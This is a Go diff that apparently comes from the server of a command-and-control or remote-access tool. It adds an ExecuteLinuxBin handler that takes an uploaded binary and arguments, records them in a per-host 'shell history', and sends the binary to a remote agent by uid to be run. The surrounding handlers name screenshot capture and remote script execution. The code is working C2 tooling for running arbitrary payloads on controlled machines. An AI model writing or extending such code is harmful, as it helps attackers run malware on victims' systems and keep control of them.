@@ -683,6 +683,47 @@ func ExecuteBin(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
 }
 
+func ExecuteLinuxBin(c *gin.Context) {
+	file, _ := c.FormFile("file")
+	if file == nil {
+		c.JSON(200, gin.H{"status": 400, "data": "No file uploaded"})
+		return
+	}
+
+	src, err := file.Open()
+	if err != nil {
+		c.JSON(200, gin.H{"status": 400, "data": "Unable to open file"})
+		return
+	}
+	defer src.Close()
+
+	fileBytes, err := ioutil.ReadAll(src)
+	if err != nil {
+		c.JSON(200, gin.H{"status": 400, "data": "Unable to read file"})
+		return
+	}
+
+	uid := c.PostForm("uid")
+	args := c.PostForm("args")
+
+	var shellHistory database.Shell
+	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
+	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + "execute-linux-bin " + file.Filename + " " + args + "\n"
+	database.Engine.Where("uid = ?", uid).Update(&shellHistory)
+
+	fileLength := len(fileBytes)
+	fileLengthBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
+	byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
+
+	cmdTypeBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxBin))
+	byteToSend = append(cmdTypeBytes, byteToSend...)
+	sendcommand.SendCommandBytes(uid, byteToSend)
+
+	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+}
+
 func CaptureScreenshot(c *gin.Context) {
 	var req struct {
 		Uid string `json:"uid"`
@@ -802,3 +843,5 @@ func ExecuteLinuxScript(c *gin.Context) {
 
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
 }
+
+
